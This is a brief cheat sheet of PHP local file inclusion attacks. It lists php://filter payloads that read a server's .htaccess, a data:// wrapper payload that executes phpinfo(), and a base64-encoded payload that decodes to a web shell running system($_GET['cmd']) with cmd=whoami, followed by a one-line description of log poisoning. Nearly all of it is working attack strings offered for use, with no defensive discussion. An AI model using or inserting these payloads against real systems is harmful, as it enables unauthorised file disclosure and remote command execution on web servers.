PHP wrappers
- filters in PHP. Some of these are String Filters (string.rot13, string.toupper, string.tolower, and string.strip_tags), Conversion Filters (convert.base64-encode, convert.base64-decode, convert.quoted-printable-encode, and convert.quoted-printable-decode), Compression Filters (zlib.deflate and zlib.inflate),

| **Payload**                                           | **Output**                                   |
| ----------------------------------------------------- | -------------------------------------------- |
| php://filter/convert.base64-encode/resource=.htaccess | UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz |
| php://filter/string.rot13/resource=.htaccess          | ErjevgrRatvar ba Bcgvbaf -Vaqrkrf            |
| php://filter/string.toupper/resource=.htaccess        | REWRITEENGINE ON OPTIONS -INDEXES            |
| php://filter/string.tolower/resource=.htaccess        | rewriteengine on options -indexes            |
| php://filter/string.strip_tags/resource=.htaccess     | RewriteEngine on Options -Indexes            |
| No filter applied                                     | RewriteEngine on Options -Indexes            |

Data wrappers: `data:text/plain,<?php%20phpinfo();%20?>`
- Mix: `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=whoami`

Log Poisoning
-  injects executable code into a web server's log file and then uses an LFI vulnerability to include and execute this log file
